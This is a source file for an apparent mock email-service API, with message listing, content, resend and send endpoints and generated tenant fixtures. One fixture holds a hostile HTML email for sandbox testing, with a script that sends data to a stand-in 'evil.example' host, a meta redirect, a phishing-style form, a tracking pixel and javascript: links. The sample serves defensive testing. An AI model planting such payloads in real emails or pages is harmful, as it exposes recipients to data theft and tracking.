// Messages: search, detail, events, content, resend, send (JSON and raw). Fixtures are per tenant.
//
// Known fixture ids (t_acme), used by tests and for manual checks:
//   ATTACH_ID    attachments that were not stored      -> resend answers 409 attachments_not_stored
//   EXPIRED_ID   12 days old                           -> content.state=body_expired, /content and resend 410 body_expired
//   DUPLICATE_ID aborted_by_switch + possible_duplicate events
//   RECOMPOSE_ID attachment-free, no retained raw      -> resend answers {recomposed:true}
//   RAW_ID       raw retained                          -> resend answers {recomposed:false}
//   HTML_ID      hostile HTML (script, remote image, inline style, meta refresh) for the sandbox
//   BOUNCE_ID    bounced with 550 5.1.1 and TLS details
// With History:Mode=statsonly every per-message endpoint answers 410 history_not_recorded.
import { createHash } from 'node:crypto';
import { HttpError, EMAIL_RE, daysAgo, hoursAgo, iso, minutesAgo, newId, paginate, rng } from '../lib.mjs';

const fixedId = (n) => '0199a0000000' + '7000' + '8000' + n.toString(16).padStart(12, '0');
export const ATTACH_ID = fixedId(1);
export const EXPIRED_ID = fixedId(2);
export const DUPLICATE_ID = fixedId(3);
export const RECOMPOSE_ID = fixedId(4);
export const RAW_ID = fixedId(5);
export const HTML_ID = fixedId(6);
export const BOUNCE_ID = fixedId(7);

const RETENTION_DAYS = 7;
const MAX_MESSAGE_BYTES = 26214400;
const MAX_RECIPIENTS = 50;

const MX = {
  'gmail.com': 'gmail-smtp-in.l.google.com',
  'outlook.com': 'outlook-com.olc.protection.outlook.com',
  'hotmail.com': 'hotmail-com.olc.protection.outlook.com',
  'yahoo.com': 'mta5.am0.yahoodns.net',
  'icloud.com': 'mx01.mail.icloud.com',
  'example.org': 'mail.example.org',
  'proton.me': 'mail.protonmail.ch',
};
const RECIPIENT_DOMAINS = Object.keys(MX);
const LOCALS = ['alex', 'sam', 'jordan', 'priya', 'chen', 'maria', 'ivan', 'noor', 'lena', 'tom', 'ayo', 'kim'];
const SUBJECTS = [
  'Welcome to Acme',
  'Your receipt for order #{n}',
  'Reset your password',
  'Your weekly digest',
  'Invoice INV-2026-{n} is ready',
  'Your package has shipped',
  'Confirm your email address',
  'Security alert: new sign-in',
  'Your subscription renews soon',
  'We received your support request',
];

const SENDERS = {
  t_acme: [
    ['Acme', 'noreply@example.com'],
    ['Acme Billing', 'billing@example.com'],
    ['Acme Support', 'support@mail.example.com'],
  ],
  t_globex: [['Globex', 'hello@globex.test']],
  t_initech: [['Initech', 'tps@initech.test']],
};
const FALLBACK_DOMAINS = { t_acme: ['example.com', 'mail.example.com'], t_globex: ['globex.test'], t_initech: ['initech.test'] };

function hashString(s) {
  return createHash('sha1').update(s).digest().readUInt32BE(0);
}

function hex(n, r) {
  let out = '';
  while (out.length < n) out += Math.floor(r() * 16).toString(16);
  return out;
}

function tlsDetails(r, verified = true) {
  return {
    used: true,
    version: r() > 0.15 ? 'TLS 1.3' : 'TLS 1.2',
    cipher: r() > 0.15 ? 'TLS_AES_256_GCM_SHA384' : 'ECDHE-RSA-AES256-GCM-SHA384',
    verified,
    policy: verified ? 'mta-sts-enforce' : 'opportunistic',
    peerSubject: 'CN=mx.example.net',
    peerIssuer: "CN=R11, O=Let's Encrypt, C=US",
    peerSha256: hex(64, r),
  };
}

function ev(type, at, rest = {}) {
  return {
    id: newId(Date.parse(at)),
    type,
    at,
    recipient: null,
    smtpCode: null,
    enhancedCode: null,
    message: null,
    mxHost: null,
    route: null,
    tls: null,
    ...rest,
  };
}

const addMinutes = (at, m) => iso(Date.parse(at) + m * 60_000);

function eventsFor(status, receivedAt, recipients, r) {
  const out = [];
  for (const rcpt of recipients) {
    const domain = rcpt.split('@')[1];
    const mxHost = MX[domain] || `mx.${domain}`;
    const base = { recipient: rcpt, mxHost, route: 'direct' };
    out.push(ev('queued', receivedAt, { recipient: rcpt, message: 'Accepted for delivery' }));
    switch (status) {
      case 'delivered':
        if (r() < 0.2) out.push(ev('deferred', addMinutes(receivedAt, 1), { ...base, smtpCode: 451, enhancedCode: '4.7.1', message: 'Greylisted, please try again later', tls: tlsDetails(r) }));
        out.push(ev('delivered', addMinutes(receivedAt, r() < 0.2 ? 6 : 0.1), { ...base, smtpCode: 250, enhancedCode: '2.0.0', message: '2.0.0 OK queued as ' + hex(10, r), tls: tlsDetails(r) }));
        break;
      case 'deferred':
        out.push(ev('deferred', addMinutes(receivedAt, 0.2), { ...base, smtpCode: 421, enhancedCode: '4.7.0', message: 'Try again later, rate limited by recipient domain', tls: tlsDetails(r) }));
        break;
      case 'bounced':
        out.push(
          ev('bounced', addMinutes(receivedAt, 0.3), {
            ...base,
            smtpCode: 550,
            enhancedCode: r() < 0.6 ? '5.1.1' : '5.7.1',
            message: r() < 0.6 ? '5.1.1 The email account that you tried to reach does not exist' : '5.7.1 Message rejected due to local policy',
            tls: tlsDetails(r),
          }),
        );
        break;
      case 'expired':
        out.push(ev('deferred', addMinutes(receivedAt, 1), { ...base, smtpCode: 421, enhancedCode: '4.4.1', message: 'Connection timed out', tls: null }));
        out.push(ev('expired', iso(Date.parse(receivedAt) + 5 * 86_400_000), { recipient: rcpt, message: 'Queue lifetime of 5 days exceeded' }));
        break;
      case 'suppressed':
        out.length -= 1;
        out.push(ev('suppressed', receivedAt, { recipient: rcpt, message: 'Recipient is on the suppression list' }));
        break;
      case 'cancelled':
        out.push(ev('cancelled', addMinutes(receivedAt, 2), { recipient: rcpt, message: 'Cancelled by an administrator' }));
        break;
      case 'complained':
        out.push(ev('delivered', addMinutes(receivedAt, 0.1), { ...base, smtpCode: 250, enhancedCode: '2.0.0', message: '2.0.0 OK', tls: tlsDetails(r) }));
        out.push(ev('complained', addMinutes(receivedAt, 600), { recipient: rcpt, message: 'Feedback loop report (abuse)' }));
        break;
      default:
        break;
    }
  }
  return out;
}

function bodyText(subject, to) {
  return `Hello ${to.split('@')[0]},\n\n${subject}.\n\nThis is a sample message generated by the EggMail mock server.\n\nThanks,\nThe team\n`;
}
function bodyHtml(subject, to) {
  return `<html><body><h1>${subject}</h1><p>Hello <b>${to.split('@')[0]}</b>,</p><p>This is a sample message generated by the EggMail mock server.</p><p><a href="https://example.com/account">Open your account</a></p></body></html>`;
}

function buildMessages(tenantId) {
  const r = rng(hashString(tenantId) || 7);
  const count = tenantId === 't_acme' ? 80 : 12;
  const senders = SENDERS[tenantId] || SENDERS.t_acme;
  const list = [];
  const pickStatus = (ageMin) => {
    const x = r();
    if (ageMin < 30 && x < 0.3) return 'queued';
    if (x < 0.7) return 'delivered';
    if (x < 0.77) return 'deferred';
    if (x < 0.85) return 'bounced';
    if (x < 0.88) return 'expired';
    if (x < 0.92) return 'suppressed';
    if (x < 0.95) return 'cancelled';
    if (x < 0.97) return 'complained';
    return 'delivered';
  };
  for (let i = 0; i < count; i++) {
    const ageMin = r.int(2, 28 * 24 * 60);
    const receivedAt = minutesAgo(ageMin);
    const status = pickStatus(ageMin);
    const nRcpt = r() < 0.85 ? 1 : r.int(2, 3);
    const recipients = [];
    for (let k = 0; k < nRcpt; k++) recipients.push(`${r.pick(LOCALS)}${r.int(1, 99)}@${r.pick(RECIPIENT_DOMAINS)}`);
    const [name, addr] = r.pick(senders);
    const subject = r.pick(SUBJECTS).replace('{n}', String(r.int(1000, 9999)));
    list.push({
      id: newId(Date.parse(receivedAt)),
      tenantId,
      receivedAt,
      subject,
      from: `${name} <${addr}>`,
      recipients,
      status,
      size: r.int(3_000, 400_000),
      text: bodyText(subject, recipients[0]),
      html: bodyHtml(subject, recipients[0]),
      attachments: [],
      rawRetained: false,
      events: eventsFor(status, receivedAt, recipients, r),
    });
  }
  if (tenantId === 't_acme') list.push(...specialMessages(r));
  list.sort((a, b) => (a.receivedAt < b.receivedAt ? 1 : -1));
  return list;
}

function specialMessages(r) {
  const mk = (id, over) => {
    const m = {
      id,
      tenantId: 't_acme',
      from: 'Acme <noreply@example.com>',
      recipients: ['alex7@gmail.com'],
      size: 20_000,
      attachments: [],
      rawRetained: false,
      ...over,
    };
    m.text ??= bodyText(m.subject, m.recipients[0]);
    m.html ??= bodyHtml(m.subject, m.recipients[0]);
    m.events ??= eventsFor(m.status, m.receivedAt, m.recipients, r);
    return m;
  };
  const dupAt = hoursAgo(3);
  const dup = mk(DUPLICATE_ID, { subject: 'Invoice INV-2026-0042 is ready (storage switch in flight)', receivedAt: dupAt, status: 'delivered', recipients: ['priya12@outlook.com'], events: [] });
  dup.events = [
    ev('queued', dupAt, { recipient: 'priya12@outlook.com', message: 'Accepted for delivery' }),
    ev('aborted_by_switch', addMinutes(dupAt, 20), { recipient: 'priya12@outlook.com', mxHost: MX['outlook.com'], route: 'direct', message: 'In-flight delivery aborted when the storage switch quiesced (after the end of DATA)' }),
    ev('possible_duplicate', addMinutes(dupAt, 20), { recipient: 'priya12@outlook.com', message: 'Requeued after the end of DATA was sent; the remote server may already have accepted it' }),
    ev('delivered', addMinutes(dupAt, 25), { recipient: 'priya12@outlook.com', mxHost: MX['outlook.com'], route: 'direct', smtpCode: 250, enhancedCode: '2.0.0', message: '2.0.0 OK', tls: tlsDetails(r) }),
  ];
  const bounceAt = hoursAgo(30);
  const bounce = mk(BOUNCE_ID, { subject: 'Your receipt for order #5521', receivedAt: bounceAt, status: 'bounced', recipients: ['nobody@example.org'] });
  bounce.events = [
    ev('queued', bounceAt, { recipient: 'nobody@example.org', message: 'Accepted for delivery' }),
    ev('bounced', addMinutes(bounceAt, 0.4), { recipient: 'nobody@example.org', mxHost: 'mail.example.org', route: 'direct', smtpCode: 550, enhancedCode: '5.1.1', message: '5.1.1 The email account that you tried to reach does not exist', tls: tlsDetails(r) }),
  ];
  return [
    mk(ATTACH_ID, {
      subject: 'Contract draft with attachments',
      receivedAt: daysAgo(2),
      status: 'delivered',
      recipients: ['maria31@yahoo.com'],
      size: 1_450_000,
      attachments: [
        { filename: 'contract-draft.pdf', content_type: 'application/pdf', size: 1_200_000 },
        { filename: 'logo.png', content_type: 'image/png', size: 24_000, content_id: 'logo' },
      ],
    }),
    mk(EXPIRED_ID, { subject: 'Welcome to Acme (old message)', receivedAt: daysAgo(12), status: 'delivered', recipients: ['tom9@gmail.com'] }),
    dup,
    mk(RECOMPOSE_ID, { subject: 'Password reset for kim4', receivedAt: hoursAgo(20), status: 'delivered', recipients: ['kim4@icloud.com'] }),
    mk(RAW_ID, { subject: 'Signed notice (raw retained)', receivedAt: hoursAgo(26), status: 'delivered', recipients: ['lena50@proton.me'], rawRetained: true }),
    mk(HTML_ID, {
      subject: 'Sandbox test: hostile HTML',
      receivedAt: minutesAgo(45),
      status: 'delivered',
      recipients: ['sam3@gmail.com'],
      text: 'Plain text part of the hostile HTML sandbox test message.\nIf you can read this in the Text tab, the text view works.\n',
      html:
        '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"><style>body{font-family:serif}</style></head><body>' +
        '<h1 style="color:#c00">Sandbox test</h1>' +
        '<script>document.title="pwned";fetch("https://evil.example/steal")</script>' +
        '<p onclick="alert(1)">Click me (inline handler)</p>' +
        '<img src="https://tracker.example/pixel.gif" width="1" height="1" alt="">' +
        '<form action="https://evil.example/post"><input name="x"><button>Send</button></form>' +
        '<a href="javascript:alert(1)">javascript link</a> <a href="https://example.com/">normal link</a>' +
        '</body></html>',
    }),
    bounce,
  ];
}

function store(ctx) {
  return ctx.tenantData('messages', buildMessages);
}

function needHistory(ctx) {
  if (ctx.options.history === 'statsonly') {
    throw new HttpError(410, 'history_not_recorded', 'History:Mode is StatsOnly; per-message data is not stored.', { history_mode: 'StatsOnly' });
  }
}

function findMessage(ctx) {
  needHistory(ctx);
  const m = store(ctx).find((x) => x.id === ctx.params.id);
  if (!m) throw new HttpError(404, 'message_not_found', 'No message with that id (unknown, or older than the event retention).');
  return m;
}

const isExpired = (m) => Date.now() - Date.parse(m.receivedAt) > RETENTION_DAYS * 86_400_000;
const expiryProblem = (m) =>
  new HttpError(410, 'body_expired', 'The message content has expired and was removed.', {
    expired_at: iso(Date.parse(m.receivedAt) + RETENTION_DAYS * 86_400_000),
    retention_days: RETENTION_DAYS,
  });

const summary = (m) => ({ id: m.id, receivedAt: m.receivedAt, subject: m.subject, from: m.from, recipients: m.recipients, status: m.status, size: m.size });

function detail(m) {
  const expired = isExpired(m);
  return {
    ...summary(m),
    tenantId: m.tenantId,
    content: expired ? { state: 'body_expired', attachments: [] } : { state: 'available', text: m.text, html: m.html, attachments: m.attachments },
    rawRetained: m.rawRetained,
  };
}

// ---- sending ----

function parseAddress(value) {
  if (typeof value !== 'string') return null;
  const s = value.trim();
  const m = /^(?:(.*?)\s*)?<([^<>]+)>$/.exec(s);
  const address = (m ? m[2] : s).trim();
  return EMAIL_RE.test(address) ? { name: m ? m[1].replace(/^"|"$/g, '') : '', address } : null;
}

const SEND_KEYS = ['from', 'to', 'cc', 'bcc', 'reply_to', 'subject', 'text', 'html', 'headers', 'attachments', 'store_attachments', 'tags'];

async function verifiedDomains(ctx) {
  try {
    const mod = await import('./domains.mjs');
    if (typeof mod.getDomains === 'function') {
      const list = await mod.getDomains(ctx);
      return list.filter((d) => d.status === 'verified' || d.status === 'temporary_failure').map((d) => d.name.toLowerCase());
    }
  } catch {
    /* domains module not available */
  }
  return FALLBACK_DOMAINS[ctx.tenantId] || ['example.com'];
}

function fieldErrors(body) {
  const errors = [];
  const add = (field, message) => errors.push({ field, message });
  if (!body || typeof body !== 'object' || Array.isArray(body)) return [{ field: '$', message: 'A JSON object is required' }];
  for (const k of Object.keys(body)) if (!SEND_KEYS.includes(k)) add(k, 'Unknown member');
  if (!parseAddress(body.from)) add('from', 'A valid sender address is required');
  const lists = {};
  for (const f of ['to', 'cc', 'bcc']) {
    const v = body[f];
    if (v === undefined) {
      lists[f] = [];
      continue;
    }
    if (!Array.isArray(v)) {
      add(f, 'Must be an array of addresses');
      lists[f] = [];
      continue;
    }
    lists[f] = v;
    v.forEach((a, i) => {
      if (!parseAddress(a)) add(`${f}[${i}]`, `"${a}" is not a valid email address`);
    });
  }
  if (!lists.to.length) add('to', 'At least one recipient is required');
  const total = lists.to.length + lists.cc.length + lists.bcc.length;
  if (total > MAX_RECIPIENTS) add('to', `At most ${MAX_RECIPIENTS} recipients are allowed (got ${total})`);
  if (body.reply_to !== undefined && !parseAddress(body.reply_to)) add('reply_to', 'Not a valid email address');
  if (typeof body.subject !== 'string' || !body.subject.trim()) add('subject', 'A subject is required');
  else if (/[\r\n\0]/.test(body.subject)) add('subject', 'The subject must not contain line breaks');
  if (!(typeof body.text === 'string' && body.text) && !(typeof body.html === 'string' && body.html)) add('text', 'Provide a text or an html body');
  if (body.headers !== undefined) {
    if (typeof body.headers !== 'object' || body.headers === null || Array.isArray(body.headers)) add('headers', 'Must be an object of header names to values');
    else
      for (const [k, v] of Object.entries(body.headers)) {
        if (/[\r\n\0]/.test(k) || /[\r\n\0]/.test(String(v))) add('headers', `Header "${k}" contains CR, LF or NUL`);
      }
  }
  if (body.attachments !== undefined) {
    if (!Array.isArray(body.attachments)) add('attachments', 'Must be an array');
    else
      body.attachments.forEach((a, i) => {
        if (!a || typeof a.filename !== 'string' || !a.filename) add(`attachments[${i}].filename`, 'required');
        if (!a || typeof a.content !== 'string' || !a.content) add(`attachments[${i}].content`, 'Base64 content is required');
      });
  }
  if (body.tags !== undefined && !(Array.isArray(body.tags) && body.tags.every((t) => typeof t === 'string'))) add('tags', 'Must be an array of strings');
  return errors;
}

function checkRate(ctx) {
  const times = ctx.tenantData('sendTimes', () => []);
  const now = Date.now();
  while (times.length && now - times[0] > 60_000) times.shift();
  if (times.length >= 20) {
    const wait = Math.max(1, Math.ceil((60_000 - (now - times[0])) / 1000));
    throw new HttpError(429, 'rate_limited', 'More than 20 sends per minute.', {}, { 'Retry-After': String(wait) });
  }
  times.push(now);
}

function addSentMessage(ctx, { from, to, cc = [], bcc = [], subject, text, html, attachments = [], storeAttachments = false, size }) {
  const recipients = [...to, ...cc, ...bcc].map((a) => parseAddress(a).address);
  const receivedAt = iso();
  const suppressed = recipients.filter((a) => a.endsWith('@suppressed.test'));
  const allSuppressed = suppressed.length === recipients.length;
  const m = {
    id: newId(),
    tenantId: ctx.tenantId,
    receivedAt,
    subject,
    from,
    recipients,
    status: allSuppressed ? 'suppressed' : 'queued',
    size,
    text,
    html,
    attachments: attachments.map((a) => ({ filename: a.filename, content_type: a.content_type, size: Math.floor((a.content.length * 3) / 4), content_id: a.content_id ?? null })),
    rawRetained: !!storeAttachments && attachments.length > 0,
    events: recipients.map((a) => (a.endsWith('@suppressed.test') ? ev('suppressed', receivedAt, { recipient: a, message: 'Recipient is on the suppression list' }) : ev('queued', receivedAt, { recipient: a, message: 'Accepted for delivery' }))),
  };
  store(ctx).unshift(m);
  return m;
}

async function sendMessage(ctx) {
  const body = ctx.body;
  const errors = fieldErrors(body);
  if (errors.length) throw new HttpError(400, 'validation_failed', 'One or more fields are invalid.', { errors });
  const approx = JSON.stringify(body).length;
  if (approx > MAX_MESSAGE_BYTES) throw new HttpError(413, 'payload_too_large', `The message is larger than ${MAX_MESSAGE_BYTES} bytes.`);
  const domain = parseAddress(body.from).address.split('@')[1].toLowerCase();
  const verified = await verifiedDomains(ctx);
  if (!verified.includes(domain)) throw new HttpError(403, 'domain_not_verified', `The sending domain ${domain} is not a verified domain of this tenant.`, { domain });

  const key = ctx.headers['idempotency-key'];
  const keys = ctx.tenantData('idempotency', () => new Map());
  const digest = createHash('sha256').update(JSON.stringify(body)).digest('hex');
  if (key) {
    const prior = keys.get(key);
    if (prior) {
      if (prior.digest !== digest) throw new HttpError(409, 'idempotency_conflict', 'This Idempotency-Key was already used with a different request body.');
      return { status: 202, body: prior.response };
    }
  }
  checkRate(ctx);
  const m = addSentMessage(ctx, {
    from: body.from,
    to: body.to,
    cc: body.cc,
    bcc: body.bcc,
    subject: body.subject,
    text: body.text,
    html: body.html,
    attachments: body.attachments,
    storeAttachments: body.store_attachments,
    size: Math.max(approx, 500),
  });
  const response = { id: m.id, status: 'queued', recipients: m.recipients.length };
  if (key) keys.set(key, { digest, response });
  return { status: 202, body: response };
}

function decodeRaw(raw) {
  if (typeof raw !== 'string' || !raw || !/^[A-Za-z0-9+/=\r\n]+$/.test(raw)) return null;
  return Buffer.from(raw, 'base64').toString('utf8');
}

async function sendRaw(ctx) {
  const b = ctx.body || {};
  const errors = [];
  if (!parseAddress(b.from)) errors.push({ field: 'from', message: 'A valid sender address is required' });
  if (!Array.isArray(b.to) || !b.to.length) errors.push({ field: 'to', message: 'At least one recipient is required' });
  else b.to.forEach((a, i) => !parseAddress(a) && errors.push({ field: `to[${i}]`, message: `"${a}" is not a valid email address` }));
  const text = decodeRaw(b.raw);
  if (text === null) errors.push({ field: 'raw', message: 'Must be a base64 encoded RFC 5322 message' });
  if (errors.length) throw new HttpError(400, 'validation_failed', 'One or more fields are invalid.', { errors });
  const domain = parseAddress(b.from).address.split('@')[1].toLowerCase();
  if (!(await verifiedDomains(ctx)).includes(domain)) throw new HttpError(403, 'domain_not_verified', `The sending domain ${domain} is not a verified domain of this tenant.`, { domain });
  checkRate(ctx);
  const subject = /^Subject:\s*(.*)$/im.exec(text)?.[1]?.trim() || '(no subject)';
  const bodyPart = text.split(/\r?\n\r?\n/).slice(1).join('\n\n');
  const m = addSentMessage(ctx, { from: b.from, to: b.to, subject, text: bodyPart, size: Buffer.byteLength(text) });
  m.rawRetained = true;
  return { status: 202, body: { id: m.id, status: 'queued', recipients: m.recipients.length } };
}

export function register(r) {
  const opts = { tenant: true };

  r.get(
    '/api/v1/messages',
    (ctx) => {
      needHistory(ctx);
      const q = ctx.query;
      const has = (v, needle) => String(v).toLowerCase().includes(String(needle).toLowerCase());
      const from = q.from ? Date.parse(q.from) : null;
      const to = q.to ? Date.parse(q.to) : null;
      const items = store(ctx).filter(
        (m) =>
          (!q.recipient || m.recipients.some((a) => has(a, q.recipient))) &&
          (!q.sender || has(m.from, q.sender)) &&
          (!q.subject || has(m.subject, q.subject)) &&
          (!q.status || m.status === q.status) &&
          (from === null || Number.isNaN(from) || Date.parse(m.receivedAt) >= from) &&
          (to === null || Number.isNaN(to) || Date.parse(m.receivedAt) <= to),
      );
      const page = paginate(items.map(summary), q, 25);
      return page;
    },
    opts,
  );

  r.get('/api/v1/messages/:id', (ctx) => detail(findMessage(ctx)), opts);
  r.get('/api/v1/messages/:id/events', (ctx) => findMessage(ctx).events, opts);
  r.get(
    '/api/v1/messages/:id/content',
    (ctx) => {
      const m = findMessage(ctx);
      if (isExpired(m)) throw expiryProblem(m);
      return { text: m.text, html: m.html, attachments: m.attachments };
    },
    opts,
  );

  r.post(
    '/api/v1/messages/:id/resend',
    (ctx) => {
      const m = findMessage(ctx);
      if (isExpired(m)) throw expiryProblem(m);
      if (m.attachments.length > 0 && !m.rawRetained) {
        throw new HttpError(409, 'attachments_not_stored', 'The message had attachments that were not stored, so it cannot be resent.');
      }
      const receivedAt = iso();
      const copy = {
        ...m,
        id: newId(),
        receivedAt,
        status: 'queued',
        events: m.recipients.map((a) => ev('queued', receivedAt, { recipient: a, message: 'Accepted for delivery (resend)' })),
      };
      store(ctx).unshift(copy);
      return { status: 202, body: { id: copy.id, recomposed: !m.rawRetained } };
    },
    opts,
  );

  r.post('/api/v1/messages', sendMessage, opts);
  r.post('/api/v1/messages/raw', sendRaw, opts);
}
